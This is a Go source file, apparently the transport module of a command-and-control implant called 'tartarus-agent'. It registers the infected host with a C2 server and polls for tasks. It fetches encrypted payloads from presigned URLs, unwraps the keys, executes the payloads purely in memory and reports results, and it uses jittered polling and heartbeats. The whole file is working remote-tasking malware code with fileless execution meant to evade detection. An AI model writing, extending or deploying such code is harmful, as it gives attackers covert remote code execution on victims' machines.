package transport

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"runtime"
	"time"

	"tartarus-agent/config"
	"tartarus-agent/crypto"
	"tartarus-agent/executor"
)

// JobResponse models a pending job returned from the server.
type JobResponse struct {
	JobID       string `json:"job_id"`
	PayloadURL  string `json:"payload_url"`
	EncAESKey   string `json:"enc_aes_key"`
	ExecMode    string `json:"exec_mode"`
	ResultR2Key string `json:"result_r2_key"`
	IR          []byte `json:"ir"`
	IRSHA256    string `json:"ir_sha256"`
}

// JobResult represents the result produced by the agent.
type JobResult struct {
	JobID     string `json:"job_id"`
	AgentID   string `json:"agent_id"`
	Status    string `json:"status"`
	Message   string `json:"message"`
	Hostname  string `json:"hostname"`
	OS        string `json:"os"`
	Timestamp string `json:"timestamp"`
}

// Client carries agent auth state across requests.
type Client struct {
	Cfg  config.AgentConfig
	HTTP *http.Client
	Tok  string
}

// NewClient builds a transport client with hardened TLS.
func NewClient(cfg config.AgentConfig) *Client {
	return &Client{Cfg: cfg, HTTP: NewTLSClient()}
}

func (c *Client) do(req *http.Request) (*http.Response, error) {
	if c.Tok != "" {
		req.Header.Set("Authorization", "Bearer "+c.Tok)
	}
	req.Header.Set("User-Agent", "tartarus-agent/1.0")
	return c.HTTP.Do(req)
}

// Register exchanges agent identity for a bearer token.
func (c *Client) Register() error {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	body, _ := json.Marshal(map[string]any{
		"agent_id":      c.Cfg.AgentID,
		"hostname":      hostname,
		"os":            runtime.GOOS,
		"architecture":  runtime.GOARCH,
		"agent_version": "1.0.0",
		"public_key":    loadPublicKeyPEM(c.Cfg.PrivKeyPath),
	})
	resp, err := c.HTTP.Post(c.Cfg.C2BaseURL+"/agents/register", "application/json", bytes.NewReader(body))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("registration failed: HTTP %d: %s", resp.StatusCode, string(b))
	}
	var out struct {
		AgentToken string `json:"agent_token"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return err
	}
	c.Tok = out.AgentToken
	return nil
}

// Heartbeat pings the server so the agent stays marked online.
func (c *Client) Heartbeat() error {
	url := fmt.Sprintf("%s/agents/%s/heartbeat", c.Cfg.C2BaseURL, c.Cfg.AgentID)
	req, _ := http.NewRequest(http.MethodPatch, url, nil)
	resp, err := c.do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		return fmt.Errorf("heartbeat HTTP %d", resp.StatusCode)
	}
	return nil
}

// loadPublicKeyPEM derives the public key PEM from the agent's private key
// so the backend can wrap per-job AES keys for R2 delivery.
func loadPublicKeyPEM(privPath string) string {
	key, err := crypto.LoadRSAPrivateKey(privPath)
	if err != nil || key == nil {
		return ""
	}
	return crypto.PublicKeyPEM(key)
}

// resolveIR returns the IR bytes for a job, fetching/decrypting from R2 when
// the backend used encrypted delivery.
func (c *Client) resolveIR(job *JobResponse) ([]byte, error) {
	if job.PayloadURL == "" || job.EncAESKey == "" {
		return job.IR, nil
	}
	// Encrypted delivery: get presigned URL, fetch ciphertext, unwrap key.
	presigned, err := c.payloadURL(job.JobID)
	if err != nil {
		return nil, err
	}
	resp, err := c.HTTP.Get(presigned)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("payload fetch HTTP %d", resp.StatusCode)
	}
	ct, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	priv, err := crypto.LoadRSAPrivateKey(c.Cfg.PrivKeyPath)
	if err != nil {
		return nil, err
	}
	aesKey, err := crypto.RSAUnwrapKey(priv, job.EncAESKey)
	if err != nil {
		return nil, fmt.Errorf("unwrap AES key: %w", err)
	}
	return crypto.AESDecrypt(aesKey, ct)
}

func (c *Client) payloadURL(jobID string) (string, error) {
	url := fmt.Sprintf("%s/jobs/%s/payload-url", c.Cfg.C2BaseURL, jobID)
	req, _ := http.NewRequest(http.MethodGet, url, nil)
	resp, err := c.do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return "", fmt.Errorf("payload-url HTTP %d", resp.StatusCode)
	}
	var out struct {
		PayloadURL string `json:"payload_url"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return "", err
	}
	return out.PayloadURL, nil
}

// submitResult sends the completed job result back to the backend.
func (c *Client) submitResult(result JobResult) error {
	data, err := json.Marshal(result)
	if err != nil {
		return err
	}
	url := fmt.Sprintf("%s/results/submit", c.Cfg.C2BaseURL)
	req, _ := http.NewRequest(http.MethodPost, url, bytes.NewReader(data))
	req.Header.Set("Content-Type", "application/json")
	resp, err := c.do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("result submission failed: HTTP %d: %s", resp.StatusCode, string(b))
	}
	return nil
}

// PollOnce claims and executes at most one pending job.
func (c *Client) PollOnce() (bool, error) {
	url := fmt.Sprintf("%s/jobs/pending/%s", c.Cfg.C2BaseURL, c.Cfg.AgentID)
	req, _ := http.NewRequest(http.MethodGet, url, nil)
	resp, err := c.do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNotFound {
		return false, nil // idle
	}
	if resp.StatusCode == http.StatusUnauthorized {
		// token expired/invalid - re-register and retry once
		if err := c.Register(); err != nil {
			return false, err
		}
		return false, fmt.Errorf("token rejected, re-registered")
	}
	if resp.StatusCode != http.StatusOK {
		return false, fmt.Errorf("poll HTTP %d", resp.StatusCode)
	}

	var job JobResponse
	if err := json.NewDecoder(resp.Body).Decode(&job); err != nil {
		return false, err
	}

	logf("[TARTARUS-AGENT] Job received: %s (mode=%s, sha=%s)",
		job.JobID, job.ExecMode, job.IRSHA256)

	ir, err := c.resolveIR(&job)
	if err != nil {
		return false, fmt.Errorf("resolve payload: %w", err)
	}

	// Keep the task strictly in memory: no disk writes for payload handling.
	executor.LoadTaskInMemory(ir)

	resultJSON, err := executor.ExecuteIR(ir, job.ExecMode)
	if err != nil {
		_ = c.submitStatus(job.JobID, "failed", err.Error())
		return true, fmt.Errorf("IR execution failed: %w", err)
	}

	hostname, _ := os.Hostname()
	result := JobResult{
		JobID:     job.JobID,
		AgentID:   c.Cfg.AgentID,
		Status:    "success",
		Message:   string(resultJSON),
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}
	if err := c.submitResult(result); err != nil {
		return true, err
	}
	logf("[TARTARUS-AGENT] Job %s completed (%d bytes result)", job.JobID, len(result.Message))
	return true, nil
}

func (c *Client) submitStatus(jobID, status, message string) error {
	result := JobResult{
		JobID:     jobID,
		AgentID:   c.Cfg.AgentID,
		Status:    status,
		Message:   message,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}
	return c.submitResult(result)
}

// StartPollLoop starts the periodic job polling loop with jittered intervals
// and idle heartbeats.
func (c *Client) StartPollLoop() {
	minI := c.Cfg.PollMin
	if minI <= 0 {
		minI = 2
	}
	maxI := c.Cfg.PollMax
	if maxI < minI {
		maxI = minI * 3
	}

	idle := 0
	for {
		worked, err := c.PollOnce()
		if err != nil {
			logf("[TARTARUS-AGENT] poll error: %v", err)
		}
		if worked {
			idle = 0
		} else {
			idle++
			if idle%5 == 0 {
				if err := c.Heartbeat(); err != nil {
					logf("[TARTARUS-AGENT] heartbeat error: %v", err)
				}
			}
		}

		wait := minI + rand.Intn(maxI-minI+1)
		time.Sleep(time.Duration(wait) * time.Second)
	}
}

func logf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, format+"\n", args...)
}
